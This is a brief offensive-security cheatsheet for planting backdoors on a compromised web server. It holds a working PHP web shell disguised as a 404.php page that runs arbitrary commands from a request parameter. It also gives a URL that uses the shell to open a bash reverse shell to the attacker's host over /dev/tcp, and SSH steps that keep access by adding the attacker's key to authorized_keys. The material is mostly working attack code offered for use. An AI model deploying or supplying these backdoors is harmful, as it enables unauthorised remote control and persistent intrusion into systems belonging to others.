# Backdoors cheatsheets

### PHP backdoor 
> /var/www/html/404.php
```php
<?php 

    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }

?>
```
#### Accessing backdoor php
```bash
http://<target-ip>/404.php?cmd=bash -i >& /dev/tcp/<local-ip>/4444 0>&1
```
## SSH Key-Based backdoor
```bash
# generate ssh keys
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "PA$$word@123"

# Install Public Key
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# Set Permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# connecting remote target host
ssh -i id_rsa username@target.com
```
